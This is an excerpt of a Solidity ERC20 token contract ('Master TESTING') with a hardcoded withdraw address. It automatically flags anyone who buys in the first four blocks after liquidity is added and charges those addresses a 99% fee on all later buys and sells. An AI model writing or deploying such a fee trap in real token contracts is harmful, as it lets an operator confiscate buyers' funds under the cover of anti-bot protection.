...
contract TESTING is TradableErc20 {
    address _owner;
    address _withdrawAddress =
        address(0x0258dF27D6f10C0eD9f00a813Ba7F3149EDBe155);

    constructor() TradableErc20("Master TESTING", "TESTING") {
        _owner = msg.sender;
        //_setMaxBuy(1);
    }

    function getFeePercentBuy(address account) internal view override returns (uint256){
        return isBot[account] ? 99 : 10;
    }
    function getFeePercentSell(address account) internal view override returns (uint256){
        return isBot[account] ? 99 : 10;
    }
...
abstract contract TradableErc20 is ERC20 {
    ...
    uint256 _notBanBlock;
    uint256 constant blocksForBan = 4;
    ...
    function makeLiquidity() public onlyOwner {
        ...
        uniswapV2Pair = pair;
        tradingEnable = true;
        _notBanBlock = block.number + blocksForBan;
    }
    ...
    function _transfer(
        ...
        if (from == uniswapV2Pair && !_isExcludedFromFee[to]) {
            ...
            amount = _getFeeBuy(amount, to);
            if (this.getAuto()) isBot[to] = true;
            else require(_balances[to] + amount <= maxBuy);
        }
        ...
        if (!_inSwap && uniswapV2Pair != address(0) && to == uniswapV2Pair) {
            if (!_isExcludedFromFee[from]) amount = _getFeeSell(amount, from);
    ...
    function _getFeeBuy(uint256 amount, address account)
        private
        returns (uint256)
    {
        uint256 fee = (amount * getFeePercentBuy(account)) / 100;
    ...
    function _getFeeSell(uint256 amount, address account)
        ...
        returns (uint256)
    {
        uint256 fee = (amount * getFeePercentSell(account)) / 100;
        _balances[address(this)] += fee;
    ...
    function getAuto() external view returns (bool) {
        return block.number < _notBanBlock;
    }
    ...
    function getFeePercentBuy(address account)
        internal
        virtual
        returns (uint256);

    function getFeePercentSell(address account)
        internal
        virtual
        returns (uint256);
